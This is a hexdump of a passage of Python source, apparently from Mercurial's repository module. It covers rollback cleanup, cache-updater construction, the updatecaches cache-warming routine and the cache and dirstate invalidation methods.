+00018e10: 5468 6572 6520 7761 7320 6e6f 2064 6972  There was no dir
+00018e20: 7374 6174 6520 746f 2062 6163 6b75 7020  state to backup 
+00018e30: 696e 6974 6961 6c6c 792c 2077 6520 6e65  initially, we ne
+00018e40: 6564 2074 6f20 6472 6f70 0a20 2020 2020  ed to drop.     
+00018e50: 2020 2020 2020 2020 2020 2023 2074 6865             # the
+00018e60: 2065 7869 7374 696e 6720 6f6e 652e 0a20   existing one.. 
+00018e70: 2020 2020 2020 2020 2020 2020 2020 2077                 w
+00018e80: 6974 6820 7365 6c66 2e64 6972 7374 6174  ith self.dirstat
+00018e90: 652e 6368 616e 6769 6e67 5f70 6172 656e  e.changing_paren
+00018ea0: 7473 2873 656c 6629 3a0a 2020 2020 2020  ts(self):.      
+00018eb0: 2020 2020 2020 2020 2020 2020 2020 7365                se
+00018ec0: 6c66 2e64 6972 7374 6174 652e 7365 7470  lf.dirstate.setp
+00018ed0: 6172 656e 7473 2873 656c 662e 6e75 6c6c  arents(self.null
+00018ee0: 6964 290a 2020 2020 2020 2020 2020 2020  id).            
+00018ef0: 2020 2020 2020 2020 7365 6c66 2e64 6972          self.dir
+00018f00: 7374 6174 652e 636c 6561 7228 290a 0a20  state.clear().. 
+00018f10: 2020 2020 2020 2020 2020 2070 6172 656e             paren
+00018f20: 7473 203d 2074 7570 6c65 285b 702e 7265  ts = tuple([p.re
+00018f30: 7628 2920 666f 7220 7020 696e 2073 656c  v() for p in sel
+00018f40: 665b 4e6f 6e65 5d2e 7061 7265 6e74 7328  f[None].parents(
+00018f50: 295d 290a 2020 2020 2020 2020 2020 2020  )]).            
+00018f60: 6966 206c 656e 2870 6172 656e 7473 2920  if len(parents) 
+00018f70: 3e20 313a 0a20 2020 2020 2020 2020 2020  > 1:.           
+00018f80: 2020 2020 2075 692e 7374 6174 7573 280a       ui.status(.
+00018f90: 2020 2020 2020 2020 2020 2020 2020 2020                  
+00018fa0: 2020 2020 5f28 0a20 2020 2020 2020 2020      _(.         
+00018fb0: 2020 2020 2020 2020 2020 2020 2020 2062                 b
+00018fc0: 2777 6f72 6b69 6e67 2064 6972 6563 746f  'working directo
+00018fd0: 7279 206e 6f77 2062 6173 6564 206f 6e20  ry now based on 
+00018fe0: 270a 2020 2020 2020 2020 2020 2020 2020  '.              
+00018ff0: 2020 2020 2020 2020 2020 6227 7265 7669            b'revi
+00019000: 7369 6f6e 7320 2564 2061 6e64 2025 645c  sions %d and %d\
+00019010: 6e27 0a20 2020 2020 2020 2020 2020 2020  n'.             
+00019020: 2020 2020 2020 2029 0a20 2020 2020 2020         ).       
+00019030: 2020 2020 2020 2020 2020 2020 2025 2070               % p
+00019040: 6172 656e 7473 0a20 2020 2020 2020 2020  arents.         
+00019050: 2020 2020 2020 2029 0a20 2020 2020 2020         ).       
+00019060: 2020 2020 2065 6c73 653a 0a20 2020 2020       else:.     
+00019070: 2020 2020 2020 2020 2020 2075 692e 7374             ui.st
+00019080: 6174 7573 280a 2020 2020 2020 2020 2020  atus(.          
+00019090: 2020 2020 2020 2020 2020 5f28 6227 776f            _(b'wo
+000190a0: 726b 696e 6720 6469 7265 6374 6f72 7920  rking directory 
+000190b0: 6e6f 7720 6261 7365 6420 6f6e 2072 6576  now based on rev
+000190c0: 6973 696f 6e20 2564 5c6e 2729 2025 2070  ision %d\n') % p
+000190d0: 6172 656e 7473 0a20 2020 2020 2020 2020  arents.         
+000190e0: 2020 2020 2020 2029 0a20 2020 2020 2020         ).       
+000190f0: 2020 2020 206d 6572 6765 7374 6174 656d       mergestatem
+00019100: 6f64 2e6d 6572 6765 7374 6174 652e 636c  od.mergestate.cl
+00019110: 6561 6e28 7365 6c66 290a 0a20 2020 2020  ean(self)..     
+00019120: 2020 2023 2054 4f44 4f3a 2069 6620 7765     # TODO: if we
+00019130: 206b 6e6f 7720 7768 6963 6820 6e65 7720   know which new 
+00019140: 6865 6164 7320 6d61 7920 7265 7375 6c74  heads may result
+00019150: 2066 726f 6d20 7468 6973 2072 6f6c 6c62   from this rollb
+00019160: 6163 6b2c 2070 6173 730a 2020 2020 2020  ack, pass.      
+00019170: 2020 2320 7468 656d 2074 6f20 6465 7374    # them to dest
+00019180: 726f 7928 292c 2077 6869 6368 2077 696c  roy(), which wil
+00019190: 6c20 7072 6576 656e 7420 7468 6520 6272  l prevent the br
+000191a0: 616e 6368 6865 6164 2063 6163 6865 2066  anchhead cache f
+000191b0: 726f 6d20 6265 696e 670a 2020 2020 2020  rom being.      
+000191c0: 2020 2320 696e 7661 6c69 6461 7465 642e    # invalidated.
+000191d0: 0a20 2020 2020 2020 2073 656c 662e 6465  .        self.de
+000191e0: 7374 726f 7965 6428 290a 2020 2020 2020  stroyed().      
+000191f0: 2020 7265 7475 726e 2030 0a0a 2020 2020    return 0..    
+00019200: 6465 6620 5f62 7569 6c64 6361 6368 6575  def _buildcacheu
+00019210: 7064 6174 6572 2873 656c 662c 206e 6577  pdater(self, new
+00019220: 7472 616e 7361 6374 696f 6e29 3a0a 2020  transaction):.  
+00019230: 2020 2020 2020 2222 2263 616c 6c65 6420        """called 
+00019240: 6475 7269 6e67 2074 7261 6e73 6163 7469  during transacti
+00019250: 6f6e 2074 6f20 6275 696c 6420 7468 6520  on to build the 
+00019260: 6361 6c6c 6261 636b 2075 7064 6174 696e  callback updatin
+00019270: 6720 6361 6368 650a 0a20 2020 2020 2020  g cache..       
+00019280: 204c 6976 6573 206f 6e20 7468 6520 7265   Lives on the re
+00019290: 706f 7369 746f 7279 2074 6f20 6865 6c70  pository to help
+000192a0: 2065 7874 656e 7369 6f6e 2077 686f 206d   extension who m
+000192b0: 6967 6874 2077 616e 7420 746f 2061 7567  ight want to aug
+000192c0: 6d65 6e74 0a20 2020 2020 2020 2074 6869  ment.        thi
+000192d0: 7320 6c6f 6769 632e 2046 6f72 2074 6869  s logic. For thi
+000192e0: 7320 7075 7270 6f73 652c 2074 6865 2063  s purpose, the c
+000192f0: 7265 6174 6564 2074 7261 6e73 6163 7469  reated transacti
+00019300: 6f6e 2069 7320 7061 7373 6564 2074 6f20  on is passed to 
+00019310: 7468 650a 2020 2020 2020 2020 6d65 7468  the.        meth
+00019320: 6f64 2e0a 2020 2020 2020 2020 2222 220a  od..        """.
+00019330: 2020 2020 2020 2020 2320 7765 206d 7573          # we mus
+00019340: 7420 6176 6f69 6420 6379 636c 6963 2072  t avoid cyclic r
+00019350: 6566 6572 656e 6365 2062 6574 7765 656e  eference between
+00019360: 2072 6570 6f20 616e 6420 7472 616e 7361   repo and transa
+00019370: 6374 696f 6e2e 0a20 2020 2020 2020 2072  ction..        r
+00019380: 6570 6f72 6566 203d 2077 6561 6b72 6566  eporef = weakref
+00019390: 2e72 6566 2873 656c 6629 0a0a 2020 2020  .ref(self)..    
+000193a0: 2020 2020 6465 6620 7570 6461 7465 7228      def updater(
+000193b0: 7472 293a 0a20 2020 2020 2020 2020 2020  tr):.           
+000193c0: 2072 6570 6f20 3d20 7265 706f 7265 6628   repo = reporef(
+000193d0: 290a 2020 2020 2020 2020 2020 2020 6173  ).            as
+000193e0: 7365 7274 2072 6570 6f20 6973 206e 6f74  sert repo is not
+000193f0: 204e 6f6e 6520 2023 2068 656c 7020 7079   None  # help py
+00019400: 7479 7065 0a20 2020 2020 2020 2020 2020  type.           
+00019410: 2072 6570 6f2e 7570 6461 7465 6361 6368   repo.updatecach
+00019420: 6573 2874 7229 0a0a 2020 2020 2020 2020  es(tr)..        
+00019430: 7265 7475 726e 2075 7064 6174 6572 0a0a  return updater..
+00019440: 2020 2020 4075 6e66 696c 7465 7265 646d      @unfilteredm
+00019450: 6574 686f 640a 2020 2020 6465 6620 7570  ethod.    def up
+00019460: 6461 7465 6361 6368 6573 2873 656c 662c  datecaches(self,
+00019470: 2074 723d 4e6f 6e65 2c20 6675 6c6c 3d46   tr=None, full=F
+00019480: 616c 7365 2c20 6361 6368 6573 3d4e 6f6e  alse, caches=Non
+00019490: 6529 3a0a 2020 2020 2020 2020 2222 2277  e):.        """w
+000194a0: 6172 6d20 6170 7072 6f70 7269 6174 6520  arm appropriate 
+000194b0: 6361 6368 6573 0a0a 2020 2020 2020 2020  caches..        
+000194c0: 4966 2074 6869 7320 6675 6e63 7469 6f6e  If this function
+000194d0: 2069 7320 6361 6c6c 6564 2061 6674 6572   is called after
+000194e0: 2061 2074 7261 6e73 6163 7469 6f6e 2063   a transaction c
+000194f0: 6c6f 7365 642e 2054 6865 2074 7261 6e73  losed. The trans
+00019500: 6163 7469 6f6e 0a20 2020 2020 2020 2077  action.        w
+00019510: 696c 6c20 6265 2061 7661 696c 6162 6c65  ill be available
+00019520: 2069 6e20 7468 6520 2774 7227 2061 7267   in the 'tr' arg
+00019530: 756d 656e 742e 2054 6869 7320 6361 6e20  ument. This can 
+00019540: 6265 2075 7365 6420 746f 2073 656c 6563  be used to selec
+00019550: 7469 7665 6c79 0a20 2020 2020 2020 2075  tively.        u
+00019560: 7064 6174 6520 6361 6368 6573 2072 656c  pdate caches rel
+00019570: 6576 616e 7420 746f 2074 6865 2063 6861  evant to the cha
+00019580: 6e67 6573 2069 6e20 7468 6174 2074 7261  nges in that tra
+00019590: 6e73 6163 7469 6f6e 2e0a 0a20 2020 2020  nsaction...     
+000195a0: 2020 2049 6620 2766 756c 6c27 2069 7320     If 'full' is 
+000195b0: 7365 742c 206d 616b 6520 7375 7265 2061  set, make sure a
+000195c0: 6c6c 2063 6163 6865 7320 7468 6520 6675  ll caches the fu
+000195d0: 6e63 7469 6f6e 206b 6e6f 7773 2061 626f  nction knows abo
+000195e0: 7574 2068 6176 650a 2020 2020 2020 2020  ut have.        
+000195f0: 7570 2d74 6f2d 6461 7465 2064 6174 612e  up-to-date data.
+00019600: 2045 7665 6e20 7468 6520 6f6e 6573 2075   Even the ones u
+00019610: 7375 616c 6c79 206c 6f61 6465 6420 6d6f  sually loaded mo
+00019620: 7265 206c 617a 696c 792e 0a0a 2020 2020  re lazily...    
+00019630: 2020 2020 5468 6520 6066 756c 6c60 2061      The `full` a
+00019640: 7267 756d 656e 7420 6361 6e20 7461 6b65  rgument can take
+00019650: 2061 2073 7065 6369 616c 2022 706f 7374   a special "post
+00019660: 2d63 6c6f 6e65 2220 7661 6c75 652e 2049  -clone" value. I
+00019670: 6e20 7468 6973 2063 6173 650a 2020 2020  n this case.    
+00019680: 2020 2020 7468 6520 6361 6368 6520 7761      the cache wa
+00019690: 726d 696e 6720 6973 206d 6164 6520 6166  rming is made af
+000196a0: 7465 7220 6120 636c 6f6e 6520 616e 6420  ter a clone and 
+000196b0: 6f66 2074 6865 2073 6c6f 7765 7220 6361  of the slower ca
+000196c0: 6368 6520 6d69 6768 740a 2020 2020 2020  che might.      
+000196d0: 2020 6265 2073 6b69 7070 6564 2c20 6e61    be skipped, na
+000196e0: 6d65 6c79 2074 6865 2060 2e66 6e6f 6465  mely the `.fnode
+000196f0: 7461 6773 6020 6f6e 652e 2054 6869 7320  tags` one. This 
+00019700: 6172 6775 6d65 6e74 2069 7320 352e 3820  argument is 5.8 
+00019710: 7370 6563 6966 6963 0a20 2020 2020 2020  specific.       
+00019720: 2061 7320 7765 2070 6c61 6e20 666f 7220   as we plan for 
+00019730: 6120 636c 6561 6e65 7220 7761 7920 746f  a cleaner way to
+00019740: 2064 6561 6c20 7769 7468 2074 6869 7320   deal with this 
+00019750: 666f 7220 352e 392e 0a20 2020 2020 2020  for 5.9..       
+00019760: 2022 2222 0a20 2020 2020 2020 2069 6620   """.        if 
+00019770: 7472 2069 7320 6e6f 7420 4e6f 6e65 2061  tr is not None a
+00019780: 6e64 2074 722e 686f 6f6b 6172 6773 2e67  nd tr.hookargs.g
+00019790: 6574 2862 2773 6f75 7263 6527 2920 3d3d  et(b'source') ==
+000197a0: 2062 2773 7472 6970 273a 0a20 2020 2020   b'strip':.     
+000197b0: 2020 2020 2020 2023 2044 7572 696e 6720         # During 
+000197c0: 7374 7269 702c 206d 616e 7920 6361 6368  strip, many cach
+000197d0: 6573 2061 7265 2069 6e76 616c 6964 2062  es are invalid b
+000197e0: 7574 0a20 2020 2020 2020 2020 2020 2023  ut.            #
+000197f0: 206c 6174 6572 2063 616c 6c20 746f 2060   later call to `
+00019800: 6465 7374 726f 7965 6460 2077 696c 6c20  destroyed` will 
+00019810: 7265 6672 6573 6820 7468 656d 2e0a 2020  refresh them..  
+00019820: 2020 2020 2020 2020 2020 7265 7475 726e            return
+00019830: 0a0a 2020 2020 2020 2020 756e 6669 203d  ..        unfi =
+00019840: 2073 656c 662e 756e 6669 6c74 6572 6564   self.unfiltered
+00019850: 2829 0a0a 2020 2020 2020 2020 6966 2066  ()..        if f
+00019860: 756c 6c3a 0a20 2020 2020 2020 2020 2020  ull:.           
+00019870: 206d 7367 203d 2028 0a20 2020 2020 2020   msg = (.       
+00019880: 2020 2020 2020 2020 2022 6066 756c 6c60           "`full`
+00019890: 2061 7267 756d 656e 7420 666f 7220 6072   argument for `r
+000198a0: 6570 6f2e 7570 6461 7465 6361 6368 6573  epo.updatecaches
+000198b0: 6020 6973 2064 6570 7265 6361 7465 645c  ` is deprecated\
+000198c0: 6e22 0a20 2020 2020 2020 2020 2020 2020  n".             
+000198d0: 2020 2022 2875 7365 2060 6361 6368 6573     "(use `caches
+000198e0: 3d72 6570 6f73 6974 6f72 792e 4341 4348  =repository.CACH
+000198f0: 455f 414c 4c60 2069 6e73 7465 6164 2922  E_ALL` instead)"
+00019900: 0a20 2020 2020 2020 2020 2020 2029 0a20  .            ). 
+00019910: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+00019920: 7569 2e64 6570 7265 6377 6172 6e28 6d73  ui.deprecwarn(ms
+00019930: 672c 2062 2235 2e39 2229 0a20 2020 2020  g, b"5.9").     
+00019940: 2020 2020 2020 2063 6163 6865 7320 3d20         caches = 
+00019950: 7265 706f 7369 746f 7279 2e43 4143 4845  repository.CACHE
+00019960: 535f 414c 4c0a 2020 2020 2020 2020 2020  S_ALL.          
+00019970: 2020 6966 2066 756c 6c20 3d3d 2062 2270    if full == b"p
+00019980: 6f73 742d 636c 6f6e 6522 3a0a 2020 2020  ost-clone":.    
+00019990: 2020 2020 2020 2020 2020 2020 6361 6368              cach
+000199a0: 6573 203d 2072 6570 6f73 6974 6f72 792e  es = repository.
+000199b0: 4341 4348 4553 5f50 4f53 545f 434c 4f4e  CACHES_POST_CLON
+000199c0: 450a 2020 2020 2020 2020 2020 2020 6361  E.            ca
+000199d0: 6368 6573 203d 2072 6570 6f73 6974 6f72  ches = repositor
+000199e0: 792e 4341 4348 4553 5f41 4c4c 0a20 2020  y.CACHES_ALL.   
+000199f0: 2020 2020 2065 6c69 6620 6361 6368 6573       elif caches
+00019a00: 2069 7320 4e6f 6e65 3a0a 2020 2020 2020   is None:.      
+00019a10: 2020 2020 2020 6361 6368 6573 203d 2072        caches = r
+00019a20: 6570 6f73 6974 6f72 792e 4341 4348 4553  epository.CACHES
+00019a30: 5f44 4546 4155 4c54 0a0a 2020 2020 2020  _DEFAULT..      
+00019a40: 2020 6966 2072 6570 6f73 6974 6f72 792e    if repository.
+00019a50: 4341 4348 455f 4252 414e 4348 4d41 505f  CACHE_BRANCHMAP_
+00019a60: 5345 5256 4544 2069 6e20 6361 6368 6573  SERVED in caches
+00019a70: 3a0a 2020 2020 2020 2020 2020 2020 6966  :.            if
+00019a80: 2074 7220 6973 204e 6f6e 6520 6f72 2074   tr is None or t
+00019a90: 722e 6368 616e 6765 735b 6227 6f72 6967  r.changes[b'orig
+00019aa0: 7265 706f 6c65 6e27 5d20 3c20 6c65 6e28  repolen'] < len(
+00019ab0: 7365 6c66 293a 0a20 2020 2020 2020 2020  self):.         
+00019ac0: 2020 2020 2020 2023 2061 6363 6573 7369         # accessi
+00019ad0: 6e67 2074 6865 2027 7365 7276 6564 2720  ng the 'served' 
+00019ae0: 6272 616e 6368 6d61 7020 7368 6f75 6c64  branchmap should
+00019af0: 2072 6566 7265 7368 2061 6c6c 2074 6865   refresh all the
+00019b00: 206f 7468 6572 732c 0a20 2020 2020 2020   others,.       
+00019b10: 2020 2020 2020 2020 2073 656c 662e 7569           self.ui
+00019b20: 2e64 6562 7567 2862 2775 7064 6174 696e  .debug(b'updatin
+00019b30: 6720 7468 6520 6272 616e 6368 2063 6163  g the branch cac
+00019b40: 6865 5c6e 2729 0a20 2020 2020 2020 2020  he\n').         
+00019b50: 2020 2020 2020 2073 656c 662e 6669 6c74         self.filt
+00019b60: 6572 6564 2862 2773 6572 7665 6427 292e  ered(b'served').
+00019b70: 6272 616e 6368 6d61 7028 290a 2020 2020  branchmap().    
+00019b80: 2020 2020 2020 2020 2020 2020 7365 6c66              self
+00019b90: 2e66 696c 7465 7265 6428 6227 7365 7276  .filtered(b'serv
+00019ba0: 6564 2e68 6964 6465 6e27 292e 6272 616e  ed.hidden').bran
+00019bb0: 6368 6d61 7028 290a 2020 2020 2020 2020  chmap().        
+00019bc0: 2020 2020 2020 2020 2320 666c 7573 6820          # flush 
+00019bd0: 616c 6c20 706f 7373 6962 6c79 2064 656c  all possibly del
+00019be0: 6179 6564 2077 7269 7465 2e0a 2020 2020  ayed write..    
+00019bf0: 2020 2020 2020 2020 2020 2020 7365 6c66              self
+00019c00: 2e5f 6272 616e 6368 6361 6368 6573 2e77  ._branchcaches.w
+00019c10: 7269 7465 5f64 656c 6179 6564 2873 656c  rite_delayed(sel
+00019c20: 6629 0a0a 2020 2020 2020 2020 6966 2072  f)..        if r
+00019c30: 6570 6f73 6974 6f72 792e 4341 4348 455f  epository.CACHE_
+00019c40: 4348 414e 4745 4c4f 475f 4341 4348 4520  CHANGELOG_CACHE 
+00019c50: 696e 2063 6163 6865 733a 0a20 2020 2020  in caches:.     
+00019c60: 2020 2020 2020 2073 656c 662e 6368 616e         self.chan
+00019c70: 6765 6c6f 672e 7570 6461 7465 5f63 6163  gelog.update_cac
+00019c80: 6865 7328 7472 616e 7361 6374 696f 6e3d  hes(transaction=
+00019c90: 7472 290a 0a20 2020 2020 2020 2069 6620  tr)..        if 
+00019ca0: 7265 706f 7369 746f 7279 2e43 4143 4845  repository.CACHE
+00019cb0: 5f4d 414e 4946 4553 544c 4f47 5f43 4143  _MANIFESTLOG_CAC
+00019cc0: 4845 2069 6e20 6361 6368 6573 3a0a 2020  HE in caches:.  
+00019cd0: 2020 2020 2020 2020 2020 7365 6c66 2e6d            self.m
+00019ce0: 616e 6966 6573 746c 6f67 2e75 7064 6174  anifestlog.updat
+00019cf0: 655f 6361 6368 6573 2874 7261 6e73 6163  e_caches(transac
+00019d00: 7469 6f6e 3d74 7229 0a0a 2020 2020 2020  tion=tr)..      
+00019d10: 2020 6966 2072 6570 6f73 6974 6f72 792e    if repository.
+00019d20: 4341 4348 455f 5245 565f 4252 414e 4348  CACHE_REV_BRANCH
+00019d30: 2069 6e20 6361 6368 6573 3a0a 2020 2020   in caches:.    
+00019d40: 2020 2020 2020 2020 7262 6320 3d20 756e          rbc = un
+00019d50: 6669 2e72 6576 6272 616e 6368 6361 6368  fi.revbranchcach
+00019d60: 6528 290a 2020 2020 2020 2020 2020 2020  e().            
+00019d70: 666f 7220 7220 696e 2075 6e66 692e 6368  for r in unfi.ch
+00019d80: 616e 6765 6c6f 673a 0a20 2020 2020 2020  angelog:.       
+00019d90: 2020 2020 2020 2020 2072 6263 2e62 7261           rbc.bra
+00019da0: 6e63 6869 6e66 6f28 7229 0a20 2020 2020  nchinfo(r).     
+00019db0: 2020 2020 2020 2072 6263 2e77 7269 7465         rbc.write
+00019dc0: 2829 0a0a 2020 2020 2020 2020 6966 2072  ()..        if r
+00019dd0: 6570 6f73 6974 6f72 792e 4341 4348 455f  epository.CACHE_
+00019de0: 4655 4c4c 5f4d 414e 4946 4553 5420 696e  FULL_MANIFEST in
+00019df0: 2063 6163 6865 733a 0a20 2020 2020 2020   caches:.       
+00019e00: 2020 2020 2023 2065 6e73 7572 6520 7468       # ensure th
+00019e10: 6520 776f 726b 696e 6720 636f 7079 2070  e working copy p
+00019e20: 6172 656e 7473 2061 7265 2069 6e20 7468  arents are in th
+00019e30: 6520 6d61 6e69 6665 7374 6675 6c6c 7465  e manifestfullte
+00019e40: 7874 6361 6368 650a 2020 2020 2020 2020  xtcache.        
+00019e50: 2020 2020 666f 7220 6374 7820 696e 2073      for ctx in s
+00019e60: 656c 665b 6227 2e27 5d2e 7061 7265 6e74  elf[b'.'].parent
+00019e70: 7328 293a 0a20 2020 2020 2020 2020 2020  s():.           
+00019e80: 2020 2020 2063 7478 2e6d 616e 6966 6573       ctx.manifes
+00019e90: 7428 2920 2023 2061 6363 6573 7369 6e67  t()  # accessing
+00019ea0: 2074 6865 206d 616e 6966 6573 7420 6973   the manifest is
+00019eb0: 2065 6e6f 7567 680a 0a20 2020 2020 2020   enough..       
+00019ec0: 2069 6620 7265 706f 7369 746f 7279 2e43   if repository.C
+00019ed0: 4143 4845 5f46 494c 455f 4e4f 4445 5f54  ACHE_FILE_NODE_T
+00019ee0: 4147 5320 696e 2063 6163 6865 733a 0a20  AGS in caches:. 
+00019ef0: 2020 2020 2020 2020 2020 2023 2061 6363             # acc
+00019f00: 6573 7369 6e67 2066 6e6f 6465 2063 6163  essing fnode cac
+00019f10: 6865 2077 6172 6d73 2074 6865 2063 6163  he warms the cac
+00019f20: 6865 0a20 2020 2020 2020 2020 2020 2074  he.            t
+00019f30: 6167 736d 6f64 2e66 6e6f 6465 7265 7673  agsmod.fnoderevs
+00019f40: 2873 656c 662e 7569 2c20 756e 6669 2c20  (self.ui, unfi, 
+00019f50: 756e 6669 2e63 6861 6e67 656c 6f67 2e72  unfi.changelog.r
+00019f60: 6576 7328 2929 0a0a 2020 2020 2020 2020  evs())..        
+00019f70: 6966 2072 6570 6f73 6974 6f72 792e 4341  if repository.CA
+00019f80: 4348 455f 5441 4753 5f44 4546 4155 4c54  CHE_TAGS_DEFAULT
+00019f90: 2069 6e20 6361 6368 6573 3a0a 2020 2020   in caches:.    
+00019fa0: 2020 2020 2020 2020 2320 6163 6365 7373          # access
+00019fb0: 696e 6720 7461 6773 2077 6172 6d20 7468  ing tags warm th
+00019fc0: 6520 6361 6368 650a 2020 2020 2020 2020  e cache.        
+00019fd0: 2020 2020 7365 6c66 2e74 6167 7328 290a      self.tags().
+00019fe0: 2020 2020 2020 2020 6966 2072 6570 6f73          if repos
+00019ff0: 6974 6f72 792e 4341 4348 455f 5441 4753  itory.CACHE_TAGS
+0001a000: 5f53 4552 5645 4420 696e 2063 6163 6865  _SERVED in cache
+0001a010: 733a 0a20 2020 2020 2020 2020 2020 2073  s:.            s
+0001a020: 656c 662e 6669 6c74 6572 6564 2862 2773  elf.filtered(b's
+0001a030: 6572 7665 6427 292e 7461 6773 2829 0a0a  erved').tags()..
+0001a040: 2020 2020 2020 2020 6966 2072 6570 6f73          if repos
+0001a050: 6974 6f72 792e 4341 4348 455f 4252 414e  itory.CACHE_BRAN
+0001a060: 4348 4d41 505f 414c 4c20 696e 2063 6163  CHMAP_ALL in cac
+0001a070: 6865 733a 0a20 2020 2020 2020 2020 2020  hes:.           
+0001a080: 2023 2054 6865 2043 4143 4845 5f42 5241   # The CACHE_BRA
+0001a090: 4e43 484d 4150 5f41 4c4c 2075 7064 6174  NCHMAP_ALL updat
+0001a0a0: 6573 206c 617a 696c 792d 6c6f 6164 6564  es lazily-loaded
+0001a0b0: 2063 6163 6865 7320 696d 6d65 6469 6174   caches immediat
+0001a0c0: 656c 792c 0a20 2020 2020 2020 2020 2020  ely,.           
+0001a0d0: 2023 2073 6f20 7765 2772 6520 666f 7263   # so we're forc
+0001a0e0: 696e 6720 6120 7772 6974 6520 746f 2063  ing a write to c
+0001a0f0: 6175 7365 2074 6865 7365 2063 6163 6865  ause these cache
+0001a100: 7320 746f 2062 6520 7761 726d 6564 2075  s to be warmed u
+0001a110: 700a 2020 2020 2020 2020 2020 2020 2320  p.            # 
+0001a120: 6576 656e 2069 6620 7468 6579 2068 6176  even if they hav
+0001a130: 656e 2774 2065 7870 6c69 6369 746c 7920  en't explicitly 
+0001a140: 6265 656e 2072 6571 7565 7374 6564 2079  been requested y
+0001a150: 6574 2028 6966 2074 6865 7927 7665 0a20  et (if they've. 
+0001a160: 2020 2020 2020 2020 2020 2023 206e 6576             # nev
+0001a170: 6572 2062 6565 6e20 7573 6564 2062 7920  er been used by 
+0001a180: 6867 2c20 7468 6579 2077 6f6e 2774 2065  hg, they won't e
+0001a190: 7665 7220 6861 7665 2062 6565 6e20 7772  ver have been wr
+0001a1a0: 6974 7465 6e2c 2065 7665 6e20 6966 0a20  itten, even if. 
+0001a1b0: 2020 2020 2020 2020 2020 2023 2074 6865             # the
+0001a1c0: 7927 7265 2061 2073 7562 7365 7420 6f66  y're a subset of
+0001a1d0: 2061 6e6f 7468 6572 206b 696e 6420 6f66   another kind of
+0001a1e0: 2063 6163 6865 2074 6861 7420 2a68 6173   cache that *has
+0001a1f0: 2a20 6265 656e 2075 7365 6429 2e0a 2020  * been used)..  
+0001a200: 2020 2020 2020 2020 2020 666f 7220 6669            for fi
+0001a210: 6c74 2069 6e20 7265 706f 7669 6577 2e66  lt in repoview.f
+0001a220: 696c 7465 7274 6162 6c65 2e6b 6579 7328  iltertable.keys(
+0001a230: 293a 0a20 2020 2020 2020 2020 2020 2020  ):.             
+0001a240: 2020 2066 696c 7465 7265 6420 3d20 7365     filtered = se
+0001a250: 6c66 2e66 696c 7465 7265 6428 6669 6c74  lf.filtered(filt
+0001a260: 290a 2020 2020 2020 2020 2020 2020 2020  ).              
+0001a270: 2020 6669 6c74 6572 6564 2e62 7261 6e63    filtered.branc
+0001a280: 686d 6170 2829 2e77 7269 7465 2866 696c  hmap().write(fil
+0001a290: 7465 7265 6429 0a0a 2020 2020 6465 6620  tered)..    def 
+0001a2a0: 696e 7661 6c69 6461 7465 6361 6368 6573  invalidatecaches
+0001a2b0: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
+0001a2c0: 6966 2027 5f74 6167 7363 6163 6865 2720  if '_tagscache' 
+0001a2d0: 696e 2076 6172 7328 7365 6c66 293a 0a20  in vars(self):. 
+0001a2e0: 2020 2020 2020 2020 2020 2023 2063 616e             # can
+0001a2f0: 2774 2075 7365 2064 656c 6174 7472 206f  't use delattr o
+0001a300: 6e20 7072 6f78 790a 2020 2020 2020 2020  n proxy.        
+0001a310: 2020 2020 6465 6c20 7365 6c66 2e5f 5f64      del self.__d
+0001a320: 6963 745f 5f5b 275f 7461 6773 6361 6368  ict__['_tagscach
+0001a330: 6527 5d0a 0a20 2020 2020 2020 2073 656c  e']..        sel
+0001a340: 662e 5f62 7261 6e63 6863 6163 6865 732e  f._branchcaches.
+0001a350: 636c 6561 7228 290a 2020 2020 2020 2020  clear().        
+0001a360: 7365 6c66 2e69 6e76 616c 6964 6174 6576  self.invalidatev
+0001a370: 6f6c 6174 696c 6573 6574 7328 290a 2020  olatilesets().  
+0001a380: 2020 2020 2020 7365 6c66 2e5f 7370 6172        self._spar
+0001a390: 7365 7369 676e 6174 7572 6563 6163 6865  sesignaturecache
+0001a3a0: 2e63 6c65 6172 2829 0a0a 2020 2020 6465  .clear()..    de
+0001a3b0: 6620 696e 7661 6c69 6461 7465 766f 6c61  f invalidatevola
+0001a3c0: 7469 6c65 7365 7473 2873 656c 6629 3a0a  tilesets(self):.
+0001a3d0: 2020 2020 2020 2020 7365 6c66 2e66 696c          self.fil
+0001a3e0: 7465 7265 6472 6576 6361 6368 652e 636c  teredrevcache.cl
+0001a3f0: 6561 7228 290a 2020 2020 2020 2020 6f62  ear().        ob
+0001a400: 736f 6c65 7465 2e63 6c65 6172 6f62 7363  solete.clearobsc
+0001a410: 6163 6865 7328 7365 6c66 290a 2020 2020  aches(self).    
+0001a420: 2020 2020 7365 6c66 2e5f 7175 6963 6b5f      self._quick_
+0001a430: 6163 6365 7373 5f63 6861 6e67 6569 645f  access_changeid_
+0001a440: 696e 7661 6c69 6461 7465 2829 0a0a 2020  invalidate()..  
+0001a450: 2020 6465 6620 696e 7661 6c69 6461 7465    def invalidate
+0001a460: 6469 7273 7461 7465 2873 656c 6629 3a0a  dirstate(self):.
+0001a470: 2020 2020 2020 2020 2222 2249 6e76 616c          """Inval
+0001a480: 6964 6174 6573 2074 6865 2064 6972 7374  idates the dirst
+0001a490: 6174 652c 2063 6175 7369 6e67 2074 6865  ate, causing the
+0001a4a0: 206e 6578 7420 6361 6c6c 2074 6f20 6469   next call to di
+0001a4b0: 7273 7461 7465 0a20 2020 2020 2020 2074  rstate.        t
+0001a4c0: 6f20 6368 6563 6b20 6966 2069 7420 7761  o check if it wa
+0001a4d0: 7320 6d6f 6469 6669 6564 2073 696e 6365  s modified since
+0001a4e0: 2074 6865 206c 6173 7420 7469 6d65 2069   the last time i
+0001a4f0: 7420 7761 7320 7265 6164 2c0a 2020 2020  t was read,.    
+0001a500: 2020 2020 7265 7265 6164 696e 6720 6974      rereading it
+0001a510: 2069 6620 6974 2068 6173 2e0a 0a20 2020   if it has...   
+0001a520: 2020 2020 2054 6869 7320 6973 2064 6966       This is dif
+0001a530: 6665 7265 6e74 2074 6f20 6469 7273 7461  ferent to dirsta
+0001a540: 7465 2e69 6e76 616c 6964 6174 6528 2920  te.invalidate() 
+0001a550: 7468 6174 2069 7420 646f 6573 6e27 7420  that it doesn't 
+0001a560: 616c 7761 7973 0a20 2020 2020 2020 2072  always.        r
+0001a570: 6572 6561 6473 2074 6865 2064 6972 7374  ereads the dirst
+0001a580: 6174 652e 2055 7365 2064 6972 7374 6174  ate. Use dirstat
+0001a590: 652e 696e 7661 6c69 6461 7465 2829 2069  e.invalidate() i
